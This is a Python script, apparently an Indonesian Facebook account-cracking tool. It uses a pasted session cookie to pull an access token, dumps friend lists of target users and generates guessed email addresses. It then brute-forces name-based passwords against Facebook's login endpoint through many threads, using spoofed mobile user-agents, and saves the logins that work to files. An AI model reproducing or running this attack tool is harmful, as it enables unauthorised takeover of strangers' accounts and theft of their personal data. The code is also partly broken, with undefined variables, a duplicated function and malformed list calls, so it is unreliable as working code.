# Created by Lukman-xd

try:
	import re, os, sys, json, time, requests, random, datetime, subprocess, platform, bs4
	from concurrent.futures import ThreadPoolExecutor as LukmanXD
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	print(f"\n Sedang menginstall module...")
	os.system('pip install requests'); os.system('pip install futures'); os.system('pip install bs4')
	os.system('python QSP.py')
except:pass

ugen=[]
fo=[]
methode=[]
printcp=[]
passwordku=[]
pwv=[]
uid=[]
loop=0
oks=[]
cps=[]
namafile=[]
id=[]
ses=requests.Session()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13'])
	c='Mi 10 Build/QKQ1.191117.002; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/278.0.0.16.103;]'
	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
logo=(f"""\033[1;37m
\t.d88b.  .d8888. d8888b. 
\t.8P  Y8. 88'  YP 88  `8D 
\t88    88 `8bo.   88oodD' 
\t88    88   `Y8b. 88~~~   
\t`8P  d8' db   8D 88      
\t `Y88'Y8 `8888Y' 88
---------------------------------------------
 [•] Author  : Lukman-xd
 [•] Github  : Private
 [•] Whatsap : +6283177547832
 [•] Version : 1.0.0""")

def garis():
	print(f"\033[1;37m---------------------------------------------")

def clear():
	os.system('clear')
	print(logo);garis()

def login():
	clear()
	cokie = input(' Masukan cookie : ')
	with requests.Session() as ses:
		try:
			head={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
			link=ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cokie})
			find=re.findall('act=(.*?)&nav_source', link.text)
			if len(find) == 0:
				garis()
				print(' Cookie kamu kadaluarsa / tidak benar'); time.sleep(4); login()
			else:
				for x in find:
					jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cokie})
					took = re.search('(EAAB\w+)', jnck.text).group(1)
					if 'EAAB' in took:
						open('data/token.txt','w').write(took)
						open('data/cookie.txt','w').write(cokie)
						token=open('data/token.txt','r').read()
						try:
							urls=requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(token),cookies={"cookie":cokie}).json()
							nama=urls["name"]
							id=urls["id"]
							garis()
							print(' Selamat datang : \033[1;32m'+nama)
							print(' \033[1;37mId kamu : '+id)
							garis()
							print(' Login menggunakan cookie berhasil....')
							time.sleep(2)
							menu()
						except KeyError:
							garis()
							print(' Cookie kamu kadaluarsa / tidak benar'); time.sleep(4); login()
		except requests.exceptions.ConnectionError:
			garis()
			print(' Koneksi kamu terganggu'); exit()
		except AttributeError:
			garis()
			print(' Cookie kamu kadaluarsa / tidak benar'); time.sleep(4); login()

def publik():
	try:
		token=open('data/token.txt','r').read()
		cookie=open('data/cookie.txt','r').read()
	except IOError:
		clear()
		print(' Cookie kamu sudah kadaluarsa');time.sleep(4); login()
	try:
		urls=requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(token),cookies={"cookie":cookie}).json()
		nama=urls["name"]
		clear()
		print(' Selamat datang : \033[1;32m'+nama); garis()
	except KeyError:
		clear()
		print(' Cookie kamu sudah kadaluarsa');time.sleep(4); login()
	try:
		jum = int(input(' Mau berapa target cloning : '));garis()
	except ValueError:
		garis()
		print(' Masukan hanya angka user crack'); exit()
	if jum<1 or jum>100:
		exit()
	no=0
	for met in range(jum):
		no+=1
		kl=input(f' Masukan id cloning ke \033[1;32m{no} \033[1;37m: ');garis()
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token, cookies = {'cookies':cookie}).json()
			for mi in col['friends']['data']:
				try:
					try:fo.append(mi['username']+'|'+mi['name'])
					except:fo.append(mi['id']+'|'+mi['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			garis()
			print(' Koneksi kamu terganggu'); exit()
	try:
		setting_methode()
	except requests.exceptions.ConnectionError:
		garis()
		print(' Koneksi kamu terganggu'); exit()
	except (KeyError,IOError):
		garis()
		print(' Id {userr} tidak publik'); exit()
			
def dump():
	try:
		cok = {"cookie":open('data/cookie.txt','r').read()};token = open('data/token.txt','r').read()
	except IOError:
		clear()
		print(' Cookie kamu sudah kadaluarsa');time.sleep(4); login()
	try:
		urls=requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(token),cookies=cok).json()
		nama=urls["name"]
		clear()
		print(' Selamat datang : \033[1;32m'+nama); garis()
	except KeyError:
		clear()
		print(' Cookie kamu sudah kadaluarsa');time.sleep(4); login()
	try:
		pil=input(' Id akun : '); garis()
		print(' Masukan file contoh : Lukman.txt'); garis()
		nam=input(' Nama file : ')
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		exit()
	try:
		bas = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5000)&access_token={}".format(pil,token),cookies=cok).json()
		for pi in bas['friends']['data']:
			try:
				id.append(pi['id']+pm+pi['name'])
				xx.write(pi["id"]+pm+pi["name"]+"\n")
			except:continue
		clear()
		print(' Berhasil dump : \033[1;32m'+id)
		print(' File tersimpan : /sdcard/'+nam)
		garis();exit()
	except (KeyError,IOError):
		garis()
		print(' Id {pil} tidak publik'); exit()
			
def menu():
	clear()
	print(" [1] Crack file dump\n [2] Buat file dump\n [3] Cloning publik\n [4] Cloning email\n [5] Joind group whatsap\n [0] Keluar menu");garis()
	tzy=input(" Choose : ")
	if tzy in['1','01']:
		clear()
		print(' Masukan file contoh : /sdcard/File.txt')
		garis()
		file=input(' Masukan nama file : ')
		try:
			id=open(file,'r').read().splitlines()
			for z in id:
				fo.append(z)
		except FileNotFoundError:
			print(' File tidak ditemukan')
			time.sleep(1)
			menu()
		setting_methode()
	elif tzy in['2','02']:
		dump()
	elif tzy in['3','03']:
		publik()
	elif tzy in['4','04']:
		rc=random.choice
		rr=random.randint
		xc=['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
		blk=['99','official','gaming','utama','123','1234','12345','123456','cakep']
		global ok , cp
		clear()
		print(' Masukan nama contoh : andi')
		garis()
		nama=input(' Masukan nama : ')
		if ',' in str(nama):
			garis()
			print(' Masukan 1 nama saja'); exit()
		garis()
		print(' Masukan domain contoh : @gmail.com')
		garis()
		doma=input(' Masukan domain : ')
		if '@' not in str(doma) or '.com' not in str(doma):
			garis()
			print(' Masukan domain yang benar'); exit()
		garis()
		jumlah=input(' Masukan jumlah : ')
		for xyz in range(int(jumlah)):
			A=nama
			B=[f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
			C=doma
			D=f'{A}{str(rc(B))}{C}'
			if D in fo:pass
			else:fo.append(D+'|'+nama)
		setting_methode()
	elif tzy in['5','05']:
		wx=('KMKErgjMuEfJ2FUHLWlFlE')
		os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
	elif tzy in['0','00']:
		garis()
		print(' Selamat tinggal user crack'); exit()
	else:
		garis()
		print(' Menu tidak ada'); exit()
		
def setting_methode():
	clear()
	print(' Semua methode berguna coba 1 to 3'); garis()
	print(' [1] Methode 1\n [2] Methode 2\n [3] Methode 3');garis()
	methde=input(' Choose : '); garis()
	if methde in['1','01']:
		methode.append('methode1')
	elif methode in['2','02']:
		methode.append('methode2')
	elif methode in['3','03']:
		methode.append('methode3')
	else:
		print(' Pilih yang bener user crack'); exit()
	print(' Ingin menampilkan akun cp y/t : '); garis()
	akun=input(' Choose : ')
	if akun in['y','Y']:
		printcp.append('ya')
	else:
		printcp.append('no')
	clear()
	print(' Ingin menggunakan password brp'); garis()
	print(' [1] password name\n [2] password name+123\n [3] password name+123+1234\n [4] password name+123+1234+12345'); garis()
	pas=input(' Choose : '); garis()
	if pas in['1','01']:
		passwordku.append('pas1')
	elif pas in['2','02']:
		passwordku.append('pas2')
	elif pas in['3','03']:
		passwordku.append('pas3')
	elif pas in['4','04']:
		passwordku.append('pas4')
	else:
		print(' Pilih yang bener user crack'); exit()
	setting_passwor()
	
def setting_passwor():
	for user in fo:
		idf,nmf=user.split("|")[0],user.split("|")[1]
		frs=nmf.split(" ")[0]
		if 'pas1' in passwordku:
			pwv.append[nmf]
		elif 'pas2' in passwordku:
			pwv.append[nmf, frs+'123']
		elif 'pas3' in passwordku:
			pwv.append[nmf, frs+'123', frs+'1234']
		elif 'pas4' in passwordku:
			pwv.append[nmf, frs+'123', frs+'1234', frs+'12345']
		setting_methode(idf,pwv)
			
def setting_methode(idf,pwv):
	global ok,cp
	clear()
	print(' Total akun yang di crack : \033[1;32m'+str(len(fo)))
	print('\033[1;37m \x1b[38;5;208mMainkan modpes jika tidak ada hasil\033[1;37m')
	garis()
	with LukmanXD(max_workers=30) as lukman:
		if 'methode1' in methode:
			lukman.submit(crack1,idf,pwv)
		elif 'methode2' in methode:
			lukman.submit(crack2,idf,pwv)
		elif 'methode3' in methode:
			lukman.submit(crack3,idf,pwv)
	
def crack1(idf,pwv):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen)
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
				open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
				oks.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				if 'ya' in printcp:
					print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
					open('/sdcard/CP.txt', 'a').write(idf+'|'+pw+'\n')
					cps.append(idf)
					break
				else:
					print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
					open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
					oks.append(idf)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack2(idf,pwv):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			fbs=random.choice(fbks)
			gtt=random.choice(xxxxx)
			gttt=random.choice(xxxxx)
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua_string,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
				open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
				oks.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				if 'ya' in printcp:
					print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
					open('/sdcard/CP.txt', 'a').write(idf+'|'+pw+'\n')
					cps.append(idf)
					break
				else:
					print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
					open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
					oks.append(idf)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
try:
	try:os.mkdir('data')
	except:pass
	menu()
except requests.exceptions.ConnectionError:
	print('\n Tidak ada internet...')
	exit()
except Exception as e:pass